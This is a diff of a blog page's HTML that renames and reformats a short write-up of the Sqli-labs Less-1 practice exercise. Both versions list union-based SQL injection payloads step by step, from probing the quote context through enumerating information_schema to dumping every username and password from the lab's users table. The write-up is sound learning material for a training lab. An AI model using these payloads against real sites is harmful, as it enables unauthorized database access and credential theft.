@@ -129,18 +129,18 @@
 
 
 
-<meta name="description" content="I test ?id=1’, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1’ %23, it runs normally then test ?id=1’ union select 1,2,3 %23, but">
+<meta name="description" content="I test ?id=1&amp;#39;, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1,">
 <meta name="keywords" content="SQL Injection,SQLi Labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sqli-labs Less-1">
-<meta property="og:url" content="https://busydebug.github.io/2017/12/11/Sqli-labs-Less-1/index.html">
+<meta property="og:title" content="Less 1">
+<meta property="og:url" content="https://busydebug.github.io/2017/12/11/Less-1/index.html">
 <meta property="og:site_name" content="besydebug">
-<meta property="og:description" content="I test ?id=1’, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1’ %23, it runs normally then test ?id=1’ union select 1,2,3 %23, but">
+<meta property="og:description" content="I test ?id=1&amp;#39;, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1,">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2017-12-11T15:05:59.552Z">
+<meta property="og:updated_time" content="2017-12-12T11:12:29.145Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sqli-labs Less-1">
-<meta name="twitter:description" content="I test ?id=1’, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1’ %23, it runs normally then test ?id=1’ union select 1,2,3 %23, but">
+<meta name="twitter:title" content="Less 1">
+<meta name="twitter:description" content="I test ?id=1&amp;#39;, then return a error message showing that the sql statement using single quote so i change the sql statement to ?id=1&amp;#39; %23, it runs normally then test ?id=1&amp;#39; union select 1,">
 
 
 
@@ -170,13 +170,13 @@
 
 
 
-  <link rel="canonical" href="https://busydebug.github.io/2017/12/11/Sqli-labs-Less-1/"/>
+  <link rel="canonical" href="https://busydebug.github.io/2017/12/11/Less-1/"/>
 
 
 
 
 
-  <title>Sqli-labs Less-1 | besydebug</title>
+  <title>Less 1 | besydebug</title>
   
 
 
@@ -303,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/11/Sqli-labs-Less-1/">
+    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/11/Less-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="busydebug">
@@ -320,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Sqli-labs Less-1</h1>
+          <h1 class="post-title" itemprop="name headline">Less 1</h1>
         
 
         <div class="post-meta">
@@ -404,15 +404,15 @@
 
       
         <ul>
-<li>I test <strong>?id=1’</strong>, then return a error message showing that the sql statement using single quote</li>
-<li>so i change the sql statement to <strong>?id=1’ %23</strong>, it runs normally</li>
-<li>then test <strong>?id=1’ union select 1,2,3 %23</strong>, but return nothing useful</li>
-<li>because id is valid so the union statement cannot run, so i change the sql statement to <strong>?id=-1’ union select 1,2,3 %23</strong>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
-<li>let me try more useful sql, <strong>?id=-1’ union select 1,user(),database() %23</strong>, we can see that we get the user name and database name</li>
-<li>using database name we can get its tables name through inner database <strong>information_schema</strong></li>
-<li>try <strong>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ %23</strong>, we get tables name of database <strong>security</strong></li>
-<li>to get more data, we can try getting data from table <strong>users</strong>, <strong>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’ %23</strong>, we get columns name of table <strong>users</strong> in database <strong>security</strong></li>
-<li>finally we use <strong>?id=-1’ union select 1,group_concat(username, ‘:’),group_concat(password, ‘:’) from security.users %23</strong>, we get all username and password</li>
+<li>I test <code>?id=1&#39;</code>, then return a error message showing that the sql statement using single quote</li>
+<li>so i change the sql statement to <code>?id=1&#39; %23</code>, it runs normally</li>
+<li>then test <code>?id=1&#39; union select 1,2,3 %23</code>, but return nothing useful</li>
+<li>because id is valid so the union statement cannot run, so i change the sql statement to <code>?id=-1&#39; union select 1,2,3 %23</code>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
+<li>let me try more useful sql, <code>?id=-1&#39; union select 1,user(),database() %23</code>, we can see that we get the user name and database name</li>
+<li>using database name we can get its tables name through inner database <code>information_schema</code></li>
+<li>try <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; %23</code>, we get tables name of database <code>security</code></li>
+<li>to get more data, we can try getting data from table <code>users</code>, <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; %23</code>, we get columns name of table <code>users</code> in database <code>security</code></li>
+<li>finally we use <code>?id=-1&#39; union select 1,group_concat(username, &#39;:&#39;),group_concat(password, &#39;:&#39;) from security.users %23</code>, we get all username and password</li>
 <li>i just make notes so i don’t explain clearly, i’m sorry</li>
 </ul>
 
@@ -456,6 +456,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/12/Add-Two-Numbers/" rel="prev" title="Add Two Numbers">
+                Add Two Numbers <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -527,7 +531,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
